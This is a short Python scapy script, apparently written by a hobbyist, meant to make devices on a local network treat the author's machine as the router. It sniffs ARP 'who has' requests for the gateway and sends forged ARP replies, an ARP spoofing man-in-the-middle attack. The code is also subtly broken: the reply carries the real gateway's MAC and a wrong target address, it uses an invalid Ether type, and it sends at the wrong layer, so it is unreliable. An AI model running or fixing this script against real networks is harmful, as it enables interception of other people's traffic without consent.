'''
Make devices think im a router
forward packets to actual router or network will halt
kinda act like a switch with sending packets to source
'''

from scapy.all import TCP, IP, Ether, send, sniff, conf, getmacbyip, ARP

# Getting default gateway information
default_gateway_ip = conf.route.route("0.0.0.0")[2]
default_gateway_mac = getmacbyip(default_gateway_ip)

# Getting device information
device_ip = conf.route.route("0.0.0.0")[1]
device_mac = getmacbyip(default_gateway_ip)

'''
Target = unknown mac device
sender = device wanting the info
'''

# ARP op - 1: who has, 2: I have
def check_arp_information(packet):
    opcode = packet[ARP].op
    target_ip = packet[ARP].pdst
    target_mac = packet.src
    # print(packet.show())
    # print(packet.summary())

    if opcode == 1 and target_ip == default_gateway_ip: # Device asking for default gateway MAC
        print(f"{packet[ARP].psrc} is asking for default gateway MAC!")
        print("Sending our MAC address...")
        frame = Ether(dst=target_mac, src=default_gateway_mac, type='ARP')
        arp = ARP(op=2, hwsrc=default_gateway_mac, psrc=default_gateway_ip, hwdst=target_mac, pdst=target_ip)
        send(frame/arp, iface="ens33")

sniff(filter="arp", iface="ens33", prn=check_arp_information)